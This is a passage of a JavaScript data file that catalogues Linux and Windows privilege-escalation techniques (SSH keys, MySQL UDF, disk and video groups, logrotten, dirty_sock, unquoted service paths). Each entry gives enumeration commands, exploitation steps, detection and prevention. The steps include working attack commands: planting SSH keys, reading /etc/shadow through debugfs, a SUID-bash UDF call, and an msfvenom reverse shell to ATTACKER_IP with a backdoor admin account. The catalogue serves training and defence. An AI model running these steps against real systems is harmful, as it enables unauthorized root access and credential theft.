    tools: ['LinPEAS', 'pspy', 'netcat'],
    detection:
      'File integrity monitoring on all shell startup files (both user dotfiles and system-wide profile scripts) and auditd write-watches on ' +
      '/etc/profile.d and /etc/bash.bashrc catch unauthorized modification; monitoring for unexpected child processes spawned immediately after a login ' +
      'shell starts is also effective.',
    prevention:
      'Ensure home directories and dotfiles are not group- or world-writable (mode 700 for home directories, 644 or stricter for dotfiles), restrict ' +
      'write access to /etc/profile.d and other system-wide shell startup scripts to root only, and periodically audit these files as part of standard ' +
      'host-hardening reviews.',
    real_world_examples: [
      { reference: 'CWE-732 Incorrect Permission Assignment for Critical Resource', description: 'Writable dotfiles belonging to a privileged user are a classic, exploit-free Linux privesc vector regularly featured in beginner-to-intermediate CTF challenges and occasionally found in real environments where home directories were created with an overly permissive umask.' }
    ]
  },
  {
    id: 'linux-ssh-key-abuse',
    name: 'SSH Key Abuse (Readable Private Keys and Writable authorized_keys)',
    category: 'Credential Abuse',
    difficulty: 'Low',
    likelihood: 'Common',
    description:
      'SSH key-based authentication trust is enforced entirely through file permissions and file content, making it a frequent target of both direct ' +
      'privilege escalation and lateral movement. Two distinct misconfigurations are common: first, a private key file (typically under ~/.ssh/id_rsa, ' +
      'id_ed25519, or similar) belonging to a more privileged user is left world- or group-readable, allowing any local user who can read it to ' +
      'authenticate as that user on any host where the corresponding public key is trusted -- this is especially high-impact when the key is unencrypted ' +
      'or the passphrase can be cracked offline with tools like john or hashcat using the ssh2john conversion utility. Second, a user\'s ' +
      '~/.ssh/authorized_keys file (or the directory containing it) is writable by another, lower-privileged user or process, allowing an attacker to ' +
      'append their own public key and gain direct SSH access as the victim account without ever needing to know a password.',
    enumeration_commands: [
      { command: 'find / -name "id_rsa" -o -name "id_ed25519" -o -name "id_ecdsa" -o -name "id_dsa" 2>/dev/null', description: 'Search the filesystem broadly for private SSH key files by their standard default names.', what_to_look_for: 'Any private key readable by your current user but belonging to a different account\'s home directory.' },
      { command: 'find / -name "authorized_keys" 2>/dev/null -exec ls -la {} \\;', description: 'Locate every authorized_keys file on the system and check its write permissions.', what_to_look_for: 'An authorized_keys file (or its containing ~/.ssh directory) writable by a user other than its owner.' },
      { command: 'ls -la ~/.ssh/ /root/.ssh/ 2>/dev/null', description: 'Directly inspect permissions on the current user\'s and, if accessible, root\'s SSH configuration directory.', what_to_look_for: 'Non-default (world/group readable or writable) permissions on private keys or the authorized_keys file.' },
      { command: 'python2 /opt/ssh2john.py id_rsa > hash.txt && john hash.txt', description: 'Convert an encrypted private key into a crackable hash format and attempt an offline dictionary/brute-force attack against its passphrase.', what_to_look_for: 'A successfully cracked passphrase enabling use of the private key.' }
    ],
    exploitation_steps: [
      'Search the filesystem for readable private key files belonging to other users, and for writable authorized_keys files or .ssh directories.',
      'If a readable private key is found, check whether it is passphrase-protected by attempting to use it directly: ssh -i id_rsa targetuser@localhost.',
      'If passphrase-protected, convert it with ssh2john.py and attempt to crack the passphrase offline using john or hashcat with a suitable wordlist.',
      'Once a usable (unencrypted or successfully cracked) private key is obtained, authenticate directly as the target user: ssh -i id_rsa targetuser@localhost, or su using the key if local-only access is required and password auth is disabled.',
      'If a writable authorized_keys file or .ssh directory is found for a privileged account instead, generate a new SSH keypair locally (ssh-keygen -t ed25519 -f mykey), and append the public key to the target\'s authorized_keys file: cat mykey.pub >> /home/targetuser/.ssh/authorized_keys.',
      'Authenticate as the target user using the newly planted private key: ssh -i mykey targetuser@localhost.',
      'If the target account is root or has sudo rights, complete escalation directly; otherwise chain this initial access with further enumeration (sudo -l, additional file permission checks) to reach root.',
      'Verify final privilege level with id and remove any planted keys after the engagement if required by scope.'
    ],
    tools: ['ssh2john.py', 'John the Ripper', 'hashcat', 'ssh-keygen', 'LinPEAS'],
    detection:
      'File integrity monitoring on all ~/.ssh/authorized_keys files, combined with SSH daemon logging (sshd logs the key fingerprint used for every ' +
      'authentication in /var/log/auth.log) and alerting on authentication from a previously unseen key fingerprint, is the primary detection control. ' +
      'File permission auditing that flags any private key file readable outside its owner is equally important.',
    prevention:
      'Enforce strict permissions on all SSH material: private keys mode 600 owned by the individual user, ~/.ssh directories mode 700, and ' +
      'authorized_keys mode 600; use a centralized SSH certificate authority (SSH CA) with short-lived certificates instead of long-lived static keys ' +
      'where feasible to reduce the blast radius of any single leaked key, and periodically audit authorized_keys files across all accounts for ' +
      'unauthorized entries.',
    real_world_examples: [
      { reference: 'CWE-522 Insufficiently Protected Credentials', description: 'Readable private keys and writable authorized_keys files are consistently among the top findings in both internal penetration tests and cloud security posture assessments, frequently arising from shared home directories, misconfigured NFS mounts, or overly broad backup/restore permissions.' }
    ]
  },
  {
    id: 'linux-mysql-udf-privesc',
    name: 'MySQL/MariaDB User-Defined Function (UDF) Privilege Escalation',
    category: 'Database Service Abuse',
    difficulty: 'Medium',
    likelihood: 'Rare',
    description:
      'MySQL and MariaDB support User-Defined Functions (UDFs), which let a database user register a compiled shared library as a callable SQL ' +
      'function, extending SQL with custom native code. If the MySQL/MariaDB service runs as root (a misconfiguration, since it should run as the ' +
      'unprivileged mysql user by default) and the connecting database account has FILE and INSERT privileges on the mysql.func table (commonly true ' +
      'for accounts with broad administrative grants), an attacker who has any form of SQL access -- direct console login, or SQL injection with stacked ' +
      'query support -- can write a malicious shared library to disk using SELECT ... INTO DUMPFILE, register it as a UDF with CREATE FUNCTION, and then ' +
      'call the new function to execute arbitrary operating system commands with the privileges of the database service.',
    enumeration_commands: [
      { command: 'ps aux | grep mysql', description: 'Check which user account the MySQL/MariaDB process runs as.', what_to_look_for: 'The process running as root instead of the standard mysql service account.' },
      { command: 'mysql -u root -p -e "SELECT plugin_dir;" -e "SHOW VARIABLES LIKE \'plugin_dir\';"', description: 'From within a MySQL session, determine the plugin directory where UDF shared libraries must be placed.', what_to_look_for: 'A writable plugin_dir path, and confirmation of the exact directory required for UDF registration.' },
      { command: 'mysql -u root -p -e "SHOW GRANTS;"', description: 'Check the privileges of the currently authenticated database account.', what_to_look_for: 'FILE privilege combined with INSERT/CREATE privileges on the mysql database, both required for the UDF technique.' }
    ],
    exploitation_steps: [
      'Confirm the MySQL/MariaDB service is running as root with ps aux | grep mysql.',
      'Authenticate to the database (via direct credentials, or through a SQL injection point supporting stacked queries) and confirm FILE privilege with SHOW GRANTS.',
      'Obtain or compile a suitable UDF exploit shared library matching the target\'s architecture (public repositories such as sqlmap\'s and Metasploit\'s UDF payloads provide precompiled variants for common architectures, e.g. raptor_udf2.c compiled for x86_64 Linux).',
      'Encode the compiled .so file as a hex string and write it to disk via SQL: SELECT UNHEX(\'<hex-encoded-library>\') INTO DUMPFILE \'/usr/lib/mysql/plugin/lib_mysqludf_sys.so\'.',
      'Register the malicious library as a callable UDF: CREATE FUNCTION sys_exec RETURNS INTEGER SOUND AS \'lib_mysqludf_sys.so\'.',
      'Invoke the new function to execute arbitrary OS commands with the database service\'s privileges: SELECT sys_exec(\'chmod u+s /bin/bash\');, or a reverse shell payload.',
      'If the database process runs as root, the resulting SUID bash grants full root; run /bin/bash -p to obtain the privileged shell.',
      'Verify with id and clean up the created UDF (DROP FUNCTION sys_exec) and dropped library file after demonstrating impact if required.'
    ],
    tools: ['sqlmap (--os-shell / UDF injection support)', 'Metasploit (mysql_udf_payload)', 'raptor_udf2 exploit', 'MySQL/MariaDB client'],
    detection:
      'Database audit logging (MySQL Enterprise Audit or MariaDB\'s audit plugin) records CREATE FUNCTION and SELECT ... INTO DUMPFILE statements, both ' +
      'of which are rare in normal application traffic and make excellent high-fidelity detection signatures; file integrity monitoring on the MySQL ' +
      'plugin directory also flags newly dropped shared libraries.',
    prevention:
      'Run MySQL/MariaDB under a dedicated, unprivileged service account (never root), restrict the FILE privilege to only accounts that specifically ' +
      'require it, disable UDF support entirely if not needed (secure_file_priv can restrict INTO DUMPFILE/OUTFILE to a specific safe directory or ' +
      'disable it entirely), and apply strict least-privilege GRANT scoping for all application database accounts.',
    real_world_examples: [
      { reference: 'CWE-284 Improper Access Control combined with CWE-269 Improper Privilege Management', description: 'MySQL UDF privilege escalation is a well-documented technique in database security research and is directly built into automated tools such as sqlmap\'s --os-shell functionality, reflecting its prevalence whenever a misconfigured root-run database service is discovered.' }
    ]
  },
  {
    id: 'linux-disk-group-exploitation',
    name: 'Disk Group Membership Exploitation (Raw Block Device Read/Write)',
    category: 'Group Membership Abuse',
    difficulty: 'Medium',
    likelihood: 'Rare',
    description:
      'Membership in the "disk" group on many Linux distributions grants direct read and write access to raw block devices under /dev (such as ' +
      '/dev/sda, /dev/sda1, /dev/nvme0n1), bypassing the filesystem-level permission model entirely. Because the block device represents the raw bytes ' +
      'of the disk, an attacker with disk group membership can use a tool like debugfs (for ext2/3/4 filesystems) to directly read or write arbitrary ' +
      'files on the mounted root filesystem regardless of their normal Unix permissions, effectively defeating all file-level access controls including ' +
      'those protecting /etc/shadow or root\'s SSH keys.',
    enumeration_commands: [
      { command: 'id', description: 'Check group memberships of the current user.', what_to_look_for: 'The literal group name "disk" in the output.' },
      { command: 'ls -la /dev/sd* /dev/nvme* 2>/dev/null', description: 'Check permissions on raw block device files.', what_to_look_for: 'Group ownership of disk with read/write permission for that group.' },
      { command: 'lsblk', description: 'Identify which block device corresponds to the root filesystem partition.', what_to_look_for: 'The device name (e.g. /dev/sda1) mounted at /, which is the target for raw access.' }
    ],
    exploitation_steps: [
      'Confirm disk group membership with id, and identify the root filesystem\'s underlying block device with lsblk or mount | grep " / ".',
      'Launch debugfs against the raw device in read-write mode: debugfs -w /dev/sda1.',
      'Within the debugfs prompt, use the cat command to read arbitrary files directly from the raw filesystem image: cat /etc/shadow, bypassing normal file permission checks entirely.',
      'To write, use debugfs\'s write command to inject a local file into the target filesystem at an arbitrary path, for example overwriting or creating a file under /etc or /root/.ssh/authorized_keys.',
      'Extract /etc/shadow via debugfs cat and crack any recoverable hashes offline, or directly plant an SSH key/backdoor via the write functionality.',
      'Use the extracted credentials or planted backdoor to authenticate as root through the normal login path.',
      'Verify final access level with id.'
    ],
    tools: ['debugfs', 'LinPEAS', 'GTFOBins (disk group entries)'],
    detection:
      'Monitoring group membership changes (auditd watching /etc/group) and restricting who is added to the disk group is the primary control; ' +
      'debugfs usage against a live root device is unusual enough that process-execution monitoring for debugfs invocations is a high-fidelity ' +
      'detection signal.',
    prevention:
      'Never grant disk group membership to non-administrative users; treat it as equivalent to root given its direct raw-device access, and audit ' +
      '/etc/group regularly for unauthorized additions.',
    real_world_examples: [
      { reference: 'GTFOBins disk group technique', description: 'GTFOBins documents the debugfs-based raw filesystem read/write technique explicitly under the disk group entry, and it is a standard technique taught in Linux privilege escalation training for group-membership-based escalation.' }
    ]
  },
  {
    id: 'linux-video-group-exploitation',
    name: 'Video Group Membership Exploitation (Framebuffer Screen Capture)',
    category: 'Group Membership Abuse',
    difficulty: 'Medium',
    likelihood: 'Rare',
    description:
      'Membership in the "video" group grants access to the system\'s framebuffer device (/dev/fb0), which represents the raw pixel data currently ' +
      'displayed on the machine\'s screen. On systems where a privileged user is logged into a local graphical or virtual console session, an attacker ' +
      'with video group membership can dump the framebuffer\'s raw contents and convert it into a viewable image, potentially capturing sensitive ' +
      'information visible on screen -- passwords being typed into a visible terminal, an open password manager, or other credential material -- without ' +
      'any further exploitation.',
    enumeration_commands: [
      { command: 'id', description: 'Check group memberships for the video group.', what_to_look_for: 'The literal group name "video" in the output.' },
      { command: 'ls -la /dev/fb0', description: 'Confirm the framebuffer device exists and check its permissions.', what_to_look_for: 'Group ownership of video with read permission for that group.' },
      { command: 'cat /sys/class/graphics/fb0/virtual_size', description: 'Determine the screen resolution needed to correctly interpret the raw framebuffer dump.', what_to_look_for: 'Width and height values used to reconstruct the image correctly.' }
    ],
    exploitation_steps: [
      'Confirm video group membership with id and confirm /dev/fb0 is readable.',
      'Determine the screen resolution and color depth from /sys/class/graphics/fb0/virtual_size and /sys/class/graphics/fb0/bits_per_pixel.',
      'Dump the raw framebuffer contents: cat /dev/fb0 > /tmp/screen.raw.',
      'Convert the raw dump into a viewable image using a tool such as ImageMagick, specifying the correct resolution and pixel format: convert -depth 8 -size 1920x1080 rgba:/tmp/screen.raw /tmp/screen.png.',
      'Review the resulting image for sensitive information visible on the target\'s screen at capture time, such as credentials or confidential data.',
      'Repeat periodically if monitoring an active session over time is within the engagement\'s authorized scope, to increase the chance of capturing a credential entry moment.'
    ],
    tools: ['ImageMagick (convert)', 'GTFOBins (video group entry)', 'ffmpeg (alternative framebuffer capture)'],
    detection:
      'Group membership auditing on the video group and file-access monitoring on /dev/fb0 (via auditd watches) are the primary detection controls, ' +
      'since this technique otherwise leaves minimal forensic trace.',
    prevention:
      'Restrict video group membership to the specific local user actually using the graphical session, and avoid granting it broadly through shared ' +
      'provisioning templates; on multi-user or shared systems, disable local framebuffer access for non-console accounts where feasible.',
    real_world_examples: [
      { reference: 'GTFOBins video group technique', description: 'Documented in GTFOBins as a screen-capture-based information disclosure technique, notable because it requires no code execution vulnerability at all, only the group membership itself.' }
    ]
  },
  {
    id: 'linux-adm-group-exploitation',
    name: 'Adm Group Membership Exploitation (Log File Information Disclosure)',
    category: 'Group Membership Abuse',
    difficulty: 'Low',
    likelihood: 'Occasional',
    description:
      'The "adm" group traditionally grants read access to system log files under /var/log (auth.log, syslog, and on many distributions, application- ' +
      'specific logs). While this does not directly grant code execution, log files frequently contain sensitive information inadvertently logged by ' +
      'applications or system services: plaintext credentials passed as command-line arguments (visible in process-accounting or application debug logs), ' +
      'failed SSH login attempts revealing usernames and sometimes passwords typed into the wrong field, sudo command history showing exactly which ' +
      'commands were run as root, and API keys or tokens logged during application errors. Adm group membership is often granted more casually than disk ' +
      'or docker because its risk is less immediately obvious, making it a reliable secondary source of credential material during enumeration.',
    enumeration_commands: [
      { command: 'id', description: 'Check group memberships for adm.', what_to_look_for: 'The literal group name "adm" in the output.' },
      { command: 'ls -la /var/log/', description: 'Review readable log files and their ownership/group.', what_to_look_for: 'Log files group-owned by adm with read permission, especially auth.log, syslog, and application logs.' },
      { command: 'grep -riE "password|passwd|secret|token|api[_-]?key" /var/log/*.log 2>/dev/null', description: 'Search readable logs for inadvertently logged credential material.', what_to_look_for: 'Any plaintext credential, token, or key value captured in log output.' },
      { command: 'grep "sudo:" /var/log/auth.log | tail -50', description: 'Review the sudo command history captured in the authentication log.', what_to_look_for: 'Commands run as root, potentially revealing further privesc paths, sensitive file locations, or embedded credentials passed as arguments.' }
    ],
    exploitation_steps: [
      'Confirm adm group membership with id.',
      'Systematically review all readable files under /var/log for credential material, using targeted grep patterns for common secret indicators (password, token, key, secret, Authorization:).',
      'Review /var/log/auth.log or /var/log/secure for sudo command history, which frequently reveals exactly which administrative commands are run and sometimes includes plaintext arguments containing secrets.',
      'Review web server access/error logs if present for query strings or POST bodies containing credentials mistakenly sent over GET, or stack traces exposing configuration values.',
      'Cross-reference any discovered credentials against local service accounts, database logins, or SSH access to pivot toward direct privilege escalation.',
      'If a discovered credential grants sudo or root SSH access, use it directly to complete escalation to root.'
    ],
    tools: ['grep', 'LinPEAS', 'linux-smart-enumeration'],
    detection:
      'Adm group membership audits and DLP-style scanning of log files for accidentally logged secrets are the primary preventive controls; access ' +
      'monitoring on /var/log for reads from unusual processes/users can supplement detection.',
    prevention:
      'Restrict adm group membership to genuine log-review/monitoring personnel and centralized logging service accounts only; more importantly, ' +
      'ensure applications never log credentials, tokens, or secrets in the first place (log redaction/scrubbing at the application layer), since this ' +
      'is the root cause that makes adm group access valuable to an attacker.',
    real_world_examples: [
      { reference: 'CWE-532 Insertion of Sensitive Information into Log File', description: 'Credentials leaking into application and system logs, then exposed via adm group membership, is a persistent and common finding across real-world penetration tests and a top-ten OWASP logging failure category.' }
    ]
  },
  {
    id: 'linux-fail2ban-exploitation',
    name: 'Fail2ban Configuration Exploitation',
    category: 'Service Abuse',
    difficulty: 'Medium',
    likelihood: 'Rare',
    description:
      'Fail2ban is a widely deployed intrusion-prevention tool that monitors log files for repeated authentication failures and automatically bans ' +
      'offending IP addresses, typically by invoking an external "ban action" script that manipulates iptables/nftables or another firewall backend. ' +
      'Fail2ban runs as root (it needs root to modify firewall rules), and its ban actions are defined in configuration files under /etc/fail2ban/action.d/ ' +
      'that specify shell commands to run when a ban or unban event fires, often incorporating variables such as the offending IP address or the matched ' +
      'log line directly into the command string. If any of these action configuration files, or the log files fail2ban parses to detect failures, are ' +
      'writable by a lower-privileged user, an attacker can inject shell metacharacters into a value that fail2ban later inserts unsanitized into a ' +
      'root-privileged command, or directly modify the ban action script to execute arbitrary commands the next time a ban is triggered.',
    enumeration_commands: [
      { command: 'ps aux | grep fail2ban', description: 'Confirm fail2ban is running and note it operates as root.', what_to_look_for: 'A running fail2ban-server process owned by root.' },
      { command: 'ls -la /etc/fail2ban/action.d/ /etc/fail2ban/jail.conf /etc/fail2ban/jail.local', description: 'Check write permissions on fail2ban configuration and action files.', what_to_look_for: 'Any action definition file or jail configuration writable by a non-root user.' },
      { command: 'cat /etc/fail2ban/jail.local 2>/dev/null | grep logpath', description: 'Identify which log files fail2ban actively monitors for failure patterns.', what_to_look_for: 'A monitored log path that is itself writable by a lower-privileged user, allowing crafted log-line injection.' }
    ],
    exploitation_steps: [
      'Confirm fail2ban is running as root and identify its monitored jails and log paths via jail.local/jail.conf.',
      'Check write access to any action.d script or the jail configuration itself; if writable, directly modify the actionban command to include an arbitrary payload that runs as root on the next ban event.',
      'If instead a monitored log file is writable but action scripts are not, craft a malicious log line containing shell metacharacters in a field that fail2ban interpolates unsanitized into its ban command (this depends on the specific action\'s command template and matched regex group).',
      'Trigger the ban condition (e.g. generate enough matching failure log lines, or wait for a legitimate ban event) so fail2ban executes the crafted action command as root.',
      'Confirm the injected payload executed with root privileges (SUID bash bit set, or a caught reverse shell) and obtain a stable privileged shell.',
      'Restore any modified configuration files after demonstrating impact if required by the engagement scope.'
    ],
    tools: ['LinPEAS', 'pspy', 'fail2ban-client'],
    detection:
      'File integrity monitoring on /etc/fail2ban/ configuration and action files, combined with auditd execve logging of commands spawned by the ' +
      'fail2ban-server process, reveals both configuration tampering and any resulting unexpected child process execution.',
    prevention:
      'Restrict write access to all fail2ban configuration and action files to root only, ensure any monitored log file cannot be written by an ' +
      'untrusted user (or that fail2ban\'s regex/command templates properly escape interpolated values), and keep fail2ban updated to a version with ' +
      'hardened action command construction.',
    real_world_examples: [
      { reference: 'logrotten-style action-script injection pattern', description: 'The general class of "root service reads attacker-influenced data and shells out unsanitized" that fail2ban configuration abuse falls into is the same root cause behind the well-known logrotate/logrotten technique.' }
    ]
  },
  {
    id: 'linux-logrotate-logrotten',
    name: 'Logrotate Exploitation via logrotten (CVE-2019-14172 and Force-Compress Injection)',
    category: 'Service Abuse',
    difficulty: 'Medium',
    likelihood: 'Rare',
    description:
      'logrotate is a near-universal Linux utility for archiving and rotating log files, typically run as a root cron job on a daily schedule. If a ' +
      'log file (or its containing directory) that logrotate processes is writable by a lower-privileged user, and the logrotate configuration for that ' +
      'log uses certain directives such as compress alongside a custom compression command, or create together with su directives that switch to a ' +
      'less-trusted user context incorrectly, an attacker can exploit race conditions and symlink attacks during the rotation process to achieve ' +
      'arbitrary file write or code execution as root. The publicly released "logrotten" tool automates this exact attack chain: it races logrotate\'s ' +
      'rename/copy/compress sequence, replacing the log file with a symlink to a target file (such as /etc/bash_completion.d/ contents, or directly a ' +
      'cron.d file) at the precise moment logrotate performs its next operation, causing logrotate to write attacker-controlled, root-privileged content ' +
      'to the symlink target.',
    enumeration_commands: [
      { command: 'cat /etc/logrotate.conf /etc/logrotate.d/* 2>/dev/null', description: 'Review the logrotate configuration to identify which log files are processed, their rotation options, and any custom compress/postrotate commands.', what_to_look_for: 'A config entry for a log file that you can write to (or whose containing directory you can write to), combined with compress, create, or a custom postrotate script.' },
      { command: 'ls -la /var/log/ && find / -writable -name "*.log" 2>/dev/null', description: 'Identify writable log files or writable log directories that logrotate is configured to process.', what_to_look_for: 'Any writable log file referenced in a logrotate config, especially one belonging to an application you control.' },
      { command: 'logrotate --version', description: 'Check the installed logrotate version against known CVEs such as CVE-2019-14172 (a use-after-free triggered via crafted state file handling).', what_to_look_for: 'Versions predating the relevant security fix for the specific CVE being assessed.' }
    ],
    exploitation_steps: [
      'Identify a log file, or the directory containing it, that is writable by your current user and is processed by a root-run logrotate configuration.',
      'Download and configure the public "logrotten" exploit tool, pointing it at the target writable log file and specifying a payload file to write (commonly a script that will be sourced or executed by another root process, such as a cron.d entry or a shell profile fragment).',
      'Run logrotten in a loop that races the timing of the next logrotate execution (either the daily cron trigger, or by generating enough log growth/writes to trigger size-based rotation if configured).',
      'When the race succeeds, logrotate\'s rotation process is tricked into writing your payload content to the target file path (which logrotten sets up as a symlink at the critical moment) with root privileges.',
      'If the target file is a cron.d entry, wait for cron to execute it as root and catch the resulting reverse shell or SUID modification.',
      'If the target file is a shell profile fragment, wait for a privileged interactive login to trigger it.',
      'Verify escalation succeeded and document the exact writable log path and target file abused.'
    ],
    tools: ['logrotten (public exploit tool)', 'LinPEAS', 'pspy'],
    detection:
      'auditd file-write monitoring on directories targeted by logrotate output (especially /etc/cron.d and shell profile locations) and process- ' +
      'lineage monitoring for logrotate spawning unexpected child processes are the primary detection controls; monitoring for rapid symlink creation ' +
      'and deletion in log directories can also reveal the timing-race pattern.',
    prevention:
      'Ensure application log files and their containing directories are never writable by the application\'s own unprivileged service account in a ' +
      'way that also grants write access to other users, avoid custom postrotate scripts that operate on attacker-influenced paths, and keep logrotate ' +
      'updated to patch known race-condition and use-after-free CVEs.',
    real_world_examples: [
      { reference: 'logrotten public exploit (Debian/Ubuntu default logrotate configs)', description: 'The logrotten tool, released by security researcher Alexander Peslyak\'s colleagues and widely referenced in privilege escalation training, specifically targets default Debian/Ubuntu logrotate behavior and remains a documented technique in LinPEAS\'s automated checks.' },
      { reference: 'CVE-2019-14172', description: 'A logrotate vulnerability involving mishandling of state file entries that could lead to memory corruption, illustrating that logrotate itself, beyond configuration misuse, has also shipped exploitable memory-safety bugs.' }
    ]
  },
  {
    id: 'linux-snap-package-exploitation',
    name: 'Snap Package Exploitation (dirty_sock and Confinement Bypass Techniques)',
    category: 'Package Manager Abuse',
    difficulty: 'Medium',
    likelihood: 'Rare',
    description:
      'Snap is Canonical\'s universal Linux packaging system, and its daemon (snapd) exposes a local REST API over a Unix socket ' +
      '(/run/snapd.socket) used by the snap command-line client to install, remove, and manage packages, running with root privileges. Several ' +
      'vulnerabilities have been found in snapd\'s API authentication and authorization logic. The most notable, CVE-2019-7304 ("dirty_sock"), exploited ' +
      'a flaw in how snapd validated the UID of the calling process when handling POST requests to the /v2/create-user API endpoint: by racing or ' +
      'spoofing the socket credential check, an unprivileged local user could create a new local administrative user account with sudo access. A ' +
      'second technique abuses the fact that any local user can install a snap package they control; if that snap requests broad "classic" confinement ' +
      'or a plug granting excessive host access, and the snap store\'s review process is bypassed (side-loaded/dangerous install), it can be used as a ' +
      'vector for local code execution or privilege escalation depending on the granted interfaces.',
    enumeration_commands: [
      { command: 'snap version', description: 'Check the installed snapd version against known CVEs such as CVE-2019-7304.', what_to_look_for: 'A snapd version predating the February 2019 fix for dirty_sock (versions before 2.37.1/2.36.3 depending on the release channel).' },
      { command: 'ls -la /run/snapd.socket', description: 'Confirm the snapd control socket is present and check its permissions.', what_to_look_for: 'World-accessible socket permissions consistent with normal snapd operation, confirming the API is reachable locally.' },
      { command: 'snap list', description: 'Enumerate currently installed snaps and their confinement level.', what_to_look_for: 'Any snap installed with "classic" confinement (unconfined, full system access) that could serve as a pivot point.' }
    ],
    exploitation_steps: [
      'Check the installed snapd version with snap version to confirm exposure to CVE-2019-7304 (dirty_sock) or other relevant snapd CVEs.',
      'If vulnerable, download and run a public dirty_sock proof-of-concept exploit, which sends a crafted HTTP POST request over the local Unix socket to the /v2/create-user endpoint while manipulating socket credential passing (SO_PEERCRED spoofing or a race condition, depending on the exploit variant) to bypass the intended root-only restriction.',
      'On success, the exploit creates a new local user account with administrative (sudo) privileges without requiring any prior authentication.',
      'Authenticate as the newly created administrative user (via su or direct login) and use sudo to obtain a full root shell.',
      'If the target snapd version is already patched, evaluate alternative snap-based vectors: check for installed classic-confinement snaps that expose a writable, root-accessible interface that could be abused, or review any custom-built/side-loaded snaps for the same class of insecure operation as any other privileged local service.',
      'Verify escalation succeeded and document the exact CVE or snap confinement issue exploited.'
    ],
    tools: ['dirty_sock (public PoC)', 'snap CLI', 'curl (for direct snapd API interaction over the Unix socket)'],
    detection:
      'snapd request logging (where enabled) and monitoring for unexpected local user account creation events (auditd watching /etc/passwd and ' +
      '/etc/group, or a SIEM rule on useradd-equivalent activity outside normal provisioning workflows) are the primary detection controls for dirty_sock- ' +
      'style attacks.',
    prevention:
      'Keep snapd updated to the latest patched version as a routine part of package management, restrict snap installation privileges where snaps are ' +
      'not required for business operation, and monitor for unauthorized local account creation as a general host-hardening control regardless of the ' +
      'specific vector.',
    real_world_examples: [
      { reference: 'CVE-2019-7304 (dirty_sock)', description: 'Discovered by security researcher Chris Moberly, this snapd local privilege escalation affected default Ubuntu installations (snapd ships by default on Ubuntu) and was notable for requiring no prior privileges at all -- any local shell access was sufficient to gain root via a crafted local API request.' }
    ]
  },
];

// ============================================================================
// WINDOWS PRIVILEGE ESCALATION TECHNIQUES
// ============================================================================

const WINDOWS_PRIVESC = [
  {
    id: 'windows-unquoted-service-path',
    name: 'Unquoted Service Path Exploitation',
    category: 'Service Misconfiguration',
    difficulty: 'Low',
    likelihood: 'Common',
    description:
      'When a Windows service\'s binary path contains one or more unescaped spaces and is not wrapped in quotation marks, the Windows service ' +
      'control manager (services.exe) attempts to resolve the executable by progressively testing each space-delimited segment as a possible ' +
      'standalone executable path, working left to right, before falling back to the full literal path. For a service configured with the path ' +
      'C:\\Program Files\\Some Vendor\\Sub Folder\\service.exe, Windows will first attempt C:\\Program.exe, then C:\\Program Files\\Some.exe, then ' +
      'C:\\Program Files\\Some Vendor\\Sub.exe, before finally trying the correct full path. If any parent directory in that chain (commonly C:\\ ' +
      'itself, or an intermediate folder) is writable by a low-privileged user, that user can drop a malicious executable named to match one of these ' +
      'intermediate resolution attempts. When the service starts -- whether automatically at boot, via a service restart, or manually by an ' +
      'administrator -- Windows executes the attacker\'s planted binary instead of the legitimate service executable, running it with the service\'s ' +
      'configured privileges, which for most system services is SYSTEM.',
    enumeration_commands: [
      { command: 'wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\\Windows" | findstr /i /v """', description: 'List all services with a binary path not starting with a quotation mark and not located in the trusted C:\\Windows tree.', what_to_look_for: 'Any listed path containing a space and no surrounding double quotes.' },
      { command: 'Get-WmiObject win32_service | Where {$_.PathName -notmatch \'"\' -and $_.PathName -match \'\\s\'} | select Name, PathName, StartMode', description: 'PowerShell equivalent that filters services to those with an unquoted path containing a space.', what_to_look_for: 'Services returned by this filter, especially those with StartMode Auto and not owned by a Microsoft/Windows vendor path.' },
      { command: 'icacls "C:\\Program Files\\Vulnerable Vendor"', description: 'Check the ACL of the parent directory of a candidate unquoted-path service to confirm write access.', what_to_look_for: '(F), (M), or (W) permissions granted to Everyone, Authenticated Users, or Users groups.' },
      { command: 'accesschk.exe -uwdq "C:\\Program Files\\Vulnerable Vendor"', description: 'Use Sysinternals AccessChk to directly enumerate writable directories, which is more reliable than manually parsing icacls output.', what_to_look_for: 'A W (write) result for a low-privileged group on any directory in the unquoted path\'s resolution chain.' }
    ],
    exploitation_steps: [
      'Enumerate all services with an unquoted path containing a space using wmic service or the PowerShell Get-WmiObject filter shown above.',
      'For each candidate, identify every possible intermediate path Windows will attempt to resolve before reaching the real executable, working left to right through each space-delimited segment.',
      'Check write permissions on each candidate directory using icacls or accesschk to find the first writable location in the chain.',
      'Generate a malicious executable (msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f exe -o Program.exe, or a simple payload that adds a new local administrator account: net user attacker Password123! /add && net localgroup administrators attacker /add) and name it to exactly match the vulnerable resolution segment (e.g. Program.exe, Some.exe, or Sub.exe depending on which directory was writable).',
      'Place the malicious executable in the writable directory identified in the enumeration step.',
      'Trigger the service to start: if you have SeServiceRestartPrivilege or equivalent, restart it directly with sc start SERVICENAME or Restart-Service; otherwise wait for the next scheduled restart or system reboot.',
      'When the service starts, Windows resolves and executes the planted binary instead of the legitimate one, running it with the service\'s configured account privileges (commonly SYSTEM for built-in and many third-party services).',
      'Catch the resulting reverse shell, or confirm the new administrative account was created, then use that access to obtain a full SYSTEM/administrator session.',
      'Verify final privilege level with whoami /priv and whoami /groups.'
    ],
    tools: ['wmic', 'PowerShell (Get-WmiObject/Get-CimInstance)', 'Sysinternals AccessChk', 'icacls', 'msfvenom', 'PowerUp (Invoke-ServiceAbuse / Get-UnquotedService)', 'WinPEAS'],
    detection:
      'Endpoint monitoring for service binaries executing from non-standard, user-writable directories, combined with periodic configuration audits ' +
      'that flag any service with an unquoted path containing a space, catches this before exploitation. Sysmon Event ID 1 (process creation) correlated ' +
      'against known service executable paths reveals anomalous substitutions at service start time.',
    prevention:
      'Always enclose service binary paths in double quotes when the path contains spaces, apply the principle of least privilege to directory ' +
      'permissions under Program Files (never grant Everyone/Users write access), and run periodic automated audits (via PowerUp\'s Get-UnquotedService ' +
      'or equivalent) as part of routine Windows hardening reviews.',
    real_world_examples: [
      { reference: 'CWE-428 Unquoted Search Path or Element', description: 'Unquoted service paths remain one of the most consistently found Windows privilege escalation vectors across both third-party software installers and legacy in-house applications, frequently flagged in vulnerability scans and penetration test reports for over a decade.' },
      { reference: 'PowerUp / PowerSploit automated detection', description: 'The prevalence of this issue led directly to its inclusion as a first-class automated check in PowerUp, WinPEAS, and Seatbelt, reflecting how commonly it is still found in real enterprise environments.' }
